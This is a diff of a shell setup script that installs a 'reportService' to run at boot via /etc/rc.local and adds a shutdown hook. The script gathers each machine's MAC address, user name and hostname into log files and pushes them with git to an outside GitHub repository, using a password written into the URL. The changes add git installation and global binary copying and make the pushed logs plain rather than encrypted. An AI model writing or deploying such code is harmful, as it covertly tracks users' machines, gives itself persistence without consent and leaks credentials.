@@ -1,10 +1,5 @@
 #!/bin/sh
 
-echo $(git config --global user.email) > /tmp/.GMAILSX
-echo $(git config --global user.name) > /tmp/.GNAMESX
-git config --global --add user.email "root@rootmail.com"
-git config --global --add user.name "root"
-
 MDIR=/.data_servicex
 SDIR=$MDIR/setup
 LDIR=$MDIR/log
@@ -36,6 +31,14 @@ else
      else
           echo "g++ exists"
      fi
+     dpkg -s git
+     ret=$?
+     if [ $ret -ne 0 ]; then
+          echo "git doesn't exists"
+          sudo apt-get install -y git
+     else
+          echo "git exists"
+     fi
      sudo sed -i '/sudo reportService/d' /etc/rc.local
      sudo sed -i '$ i\sudo reportService &' /etc/rc.local
      mkdir $MDIR
@@ -66,17 +69,18 @@ fi
 if [ -d $SDIR ]
 then
      echo "$SDIR exists"
-     cd $SDIR
-     git fetch
-     ret=$?
-     if [ $ret -ne 0 ]; then
-          git config --global http.sslVerify false
-          git fetch
-     else
-          echo "fetched successfully!!!"
-     fi
-     git reset --hard
-     git pull origin master
+#     cd $SDIR
+#     git fetch
+#     ret=$?
+#     if [ $ret -ne 0 ]; then
+#          git config --global http.sslVerify false
+#          git fetch
+#     else
+#          echo "fetched successfully!!!"
+#     fi
+#     git reset --hard
+#     git pull origin master
+
 #     sudo cp $LBIN* $GBIN -a
 #     sudo cp $RDIR* $GBIN -a
 #     sudo cp $STDIR* $GBIN -a
@@ -98,7 +102,7 @@ else
                echo "fetched successfully!!!"
           fi
           git checkout master
-#         sudo cp $LBIN* $GBIN -a
+          sudo cp $LBIN* $GBIN -a
      else
           echo "$SDIR change Failed!!!"
      fi
@@ -121,8 +125,9 @@ else
           git checkout -b root-$(date '+%y_%m_%d_%I_%M_%S')
      	  read MAC </sys/class/net/eth0/address
           echo "started logx $MAC : $USER : $HOSTNAME $(date +"%D %T")" >  logx_$(date '+%y_%m_%d_%I_%M_%S').ljp
-          encriptFile
-          git add \*.crt
+#          encriptFile
+#          git add \*.crt
+          git add \*.ljp
           git config --local --add user.email "root@rootmail.com"
           git config --local --add user.name "root"
           git commit -m "root-$(date +"%D %T")"
@@ -157,8 +162,9 @@ else
           git checkout -b root-$(date '+%y_%m_%d_%I_%M_%S')
           read MAC </sys/class/net/eth0/address
           echo "started logsx $MAC : $USER : $HOSTNAME $(date +"%D %T")" >  logs_$(date '+%y_%m_%d_%I_%M_%S').ljp
-          encriptFile
-          git add \*.crt
+#          encriptFile
+#          git add \*.crt
+          git add \*.ljp
           git commit -m "root-$(date +"%D %T")"
           git push https://reportlog:1q2w3e4r5t@github.com/reportlog/setuplog_service.git --all
      else
@@ -202,10 +208,6 @@ else
     sudo chmod +x /etc/rc6.d/K99_updateReport
 fi
 
-read GMAILX </tmp/.GMAILSX
-read GNAMEX </tmp/.GNAMESX
-git config --global --add user.name "$GNAMEX"
-git config --global --add user.email "$GMAILX"
 
 #
 #!/bin/sh -e
